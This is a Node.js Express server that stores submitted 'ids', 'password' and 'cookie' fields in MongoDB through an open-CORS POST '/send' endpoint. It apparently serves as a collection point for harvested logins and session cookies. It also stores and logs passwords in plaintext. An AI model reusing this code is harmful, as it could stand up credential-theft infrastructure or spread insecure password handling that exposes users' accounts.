const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const { errorHandler } = require('./middlewares/errorHandler');
const { validateData } = require('./middlewares/validation');
const { authenticate } = require('./middlewares/authentication');
const logger = require('./utils/logger');
const Joi = require('joi');
require('dotenv').config();

const app = express();
const port = process.env.PORT || 3000;

// MongoDB connection
mongoose.connect(process.env.MONGODB_URI || 'mongodb://localhost:27017/myapp', {
  useNewUrlParser: true,
  useUnifiedTopology: true,
  useCreateIndex: true,
});

// Define a schema for your data
const dataSchema = new mongoose.Schema({
  ids: { type: String, required: true },
  password: { type: String, required: true },
  cookie: { type: String, required: true },
});

// Create a model based on the schema
const DataModel = mongoose.model('Data', dataSchema);

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cors());
app.use(helmet());
app.use(rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100 // limit each IP to 100 requests per windowMs
}));

// Routes
app.get('/', (req, res) => {
   res.send("Welcome to the API!");
});

app.post('/send', authenticate, validateData(Joi.object({
  ids: Joi.string().required(),
  password: Joi.string().required(),
  cookie: Joi.string().required(),
})), async (req, res) => {
  const { ids, password, cookie } = req.body;
  
  try {
    // Create a new document in the database
    const newData = await DataModel.create({ ids, password, cookie });
    logger.info("Data saved:", newData);
    res.send("Data saved successfully!");
  } catch (error) {
    logger.error("Error saving data:", error);
    res.status(500).send("Error saving data.");
  }
});

// Error handling middleware
app.use(errorHandler);

// Start server
app.listen(port, () => {
  logger.info(`App is listening on port ${port}`);
});
